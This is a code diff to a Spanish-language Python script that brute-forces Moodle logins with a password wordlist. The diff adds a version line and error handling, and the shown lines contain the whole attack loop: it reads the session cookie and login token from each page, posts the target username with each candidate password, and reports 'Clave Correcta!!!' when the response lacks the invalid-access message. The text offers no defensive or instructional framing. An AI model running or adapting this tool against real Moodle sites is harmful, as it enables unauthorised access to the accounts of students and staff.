@@ -46,6 +46,7 @@ print ("\n")
 print ("\n")
 print ("\n")
 
+print ("Version: 1.0")
 print ("Url Objetivo:",Url)
 print ("Usuario:", Usuario)
 print ("Diccionario de Password:", Dic)
@@ -62,60 +63,65 @@ if Url != "" and Usuario != "" and Dic != "":
        
     for linea in open(Dic,'r'):
 
-        # 1 Paso, leer con GET. Hacerse con el tokenlogin.
+        try:
+            
+            # 1 Paso, leer con GET. Hacerse con el tokenlogin.
 
-        Response=requests.get(Url)
-
-        if Response.status_code==200:
-            # Leer encabezados para sacar la id de session.
-            Encabezado= Response.headers
-
-            Cokie=Encabezado['Set-Cookie']
-
-            P1=Cokie.find("=")
-            P2=Cokie.find(";")
-
-            MoodleSession="MoodleSession=" + Cokie[P1+1:P2]
-    
-
-            # Leer body para sacar token.
-            Aux=str(Response.content)
-
-            P1=Aux.find("logintoken")
-            P2=Aux.find('"',P1+11)
-   
-            Aux=Aux[P1+19:]
-
-            P1=Aux.find('"')
-
-            LoginToken=Aux[:P1]
-
-            # 2 Paso 
-
-            print (MoodleSession, "\n" + "LoginToken:" + LoginToken + "\n" + "Password:" + linea)
-
-
-            Cabecera={"Content-Type":"application/x-www-form-urlencoded",'Cookie':MoodleSession}
-
-            Datos={"logintoken":LoginToken, 'anchor':'','username':str(Usuario.strip()),'password':str(linea.strip())}
-
-            Response=requests.post(Url, headers=Cabecera, data=Datos)
-
-            print ("Estado:" + str(Response.status_code),end="\n\n")
+            Response=requests.get(Url)
 
             if Response.status_code==200:
+                # Leer encabezados para sacar la id de session.
+                Encabezado= Response.headers
+
+                Cokie=Encabezado['Set-Cookie']
+
+                P1=Cokie.find("=")
+                P2=Cokie.find(";")
+
+                MoodleSession="MoodleSession=" + Cokie[P1+1:P2]
+        
+
+                # Leer body para sacar token.
+                Aux=str(Response.content)
+
+                P1=Aux.find("logintoken")
+                P2=Aux.find('"',P1+11)
+       
+                Aux=Aux[P1+19:]
+
+                P1=Aux.find('"')
+
+                LoginToken=Aux[:P1]
+
+                # 2 Paso 
+
+                print (MoodleSession, "\n" + "LoginToken:" + LoginToken + "\n" + "Password:" + linea)
+
 
                 Cabecera={"Content-Type":"application/x-www-form-urlencoded",'Cookie':MoodleSession}
 
-                Response=requests.get(Url, headers=Cabecera)
-    
-                Resultado=Response.content
-    
-                if str(Resultado).find("Acceso inv")!=-1:
-                    print ("Clave Incorrecta")
-                else:
-                    print ("Clave Correcta!!!")
-                    break
+                Datos={"logintoken":LoginToken, 'anchor':'','username':str(Usuario.strip()),'password':str(linea.strip())}
+
+                Response=requests.post(Url, headers=Cabecera, data=Datos)
+
+                print ("Estado:" + str(Response.status_code),end="\n\n")
+
+                if Response.status_code==200:
+
+                    Cabecera={"Content-Type":"application/x-www-form-urlencoded",'Cookie':MoodleSession}
+
+                    Response=requests.get(Url, headers=Cabecera)
+        
+                    Resultado=Response.content
+        
+                    if str(Resultado).find("Acceso inv")!=-1:
+                        print ("Clave Incorrecta")
+                    else:
+                        print ("Clave Correcta!!!")
+                        break
+        except:
+            print ("Error en conexion....")
+        
             
     
     
